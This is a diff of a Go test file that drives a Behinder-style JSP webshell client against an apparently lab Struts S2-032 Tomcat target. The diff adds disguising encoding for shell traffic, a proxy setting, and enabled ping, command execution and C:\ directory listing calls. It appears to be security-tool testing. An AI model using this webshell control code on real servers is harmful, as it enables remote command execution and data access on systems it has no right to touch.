@@ -17,7 +17,7 @@ import (
 
 func TestNewWebJSPShell(t *testing.T) {
 
-	url := "http://47.120.44.219:8080/go0p-json.jsp"
+	url := "http://192.168.3.3:8085/S2-032/go0p-json.jsp"
 	//testHeaders := map[string]string{
 	//	"xxx":  "yyy",
 	//	"go0p": "go0p",
@@ -26,13 +26,13 @@ func TestNewWebJSPShell(t *testing.T) {
 		SetSecretKey("rebeyond"),
 		//SetHeaders(testHeaders),
 		SetShellScript("jsp"),
-		SetProxy("http://127.0.0.1:9999"),
+		SetProxy("http://192.168.3.3:9999"),
 	)
 	bx.ClientRequestEncodeFormGo(func(reqBody []byte) ([]byte, error) {
 		jsonStr := `{"go0p":"1",asdfakhj,"body":{"user":"lucky"}}`
 		encodedData := base64.StdEncoding.EncodeToString(reqBody)
-		//encodedData = strings.ReplaceAll(encodedData, "+", "go0p")
-		//encodedData = strings.ReplaceAll(encodedData, "/", "yakit")
+		encodedData = strings.ReplaceAll(encodedData, "+", "go0p")
+		encodedData = strings.ReplaceAll(encodedData, "/", "yakit")
 		jsonStr = strings.ReplaceAll(jsonStr, "lucky", encodedData)
 		return []byte(jsonStr), nil
 	})
@@ -46,14 +46,16 @@ func TestNewWebJSPShell(t *testing.T) {
 		if err != nil {
 			return nil, err
 		}
+		fmt.Println("decodedData", string(decodedData))
 		return decodedData, nil
 	})
-	//ping, err := bx.Ping()
-	//if err != nil {
-	//	t.Error(err)
-	//	return
-	//}
-	//t.Logf("%v", ping)
+	ping, err := bx.Ping()
+	if err != nil {
+		t.Error(err)
+		return
+	}
+	fmt.Println("ping", ping)
+	t.Logf("%v", ping)
 
 	//info, _ := bx.BasicInfo()
 	//t.Logf("%v", string(info))
@@ -63,15 +65,16 @@ func TestNewWebJSPShell(t *testing.T) {
 		t.Error(err)
 		return
 	}
+	fmt.Println("cmd", string(cmd))
 	t.Logf("%s", string(cmd))
 
-	//dir, err := bx.listFile("C:\\")
-	////ping, err := bx.showFile("C:\\Vuln\\apache-tomcat-8.5.84\\webapps\\S2-032")
-	//if err != nil {
-	//	t.Error(err)
-	//	return
-	//}
-	//t.Logf("%s", string(dir))
+	dir, err := bx.listFile("C:\\")
+	//ping, err := bx.showFile("C:\\Vuln\\apache-tomcat-8.5.84\\webapps\\S2-032")
+	if err != nil {
+		t.Error(err)
+		return
+	}
+	t.Logf("%s", string(dir))
 	//
 	//x, err := bx.showFile("C:\\Users\\Administrator\\Desktop\\1.txt")
 	//
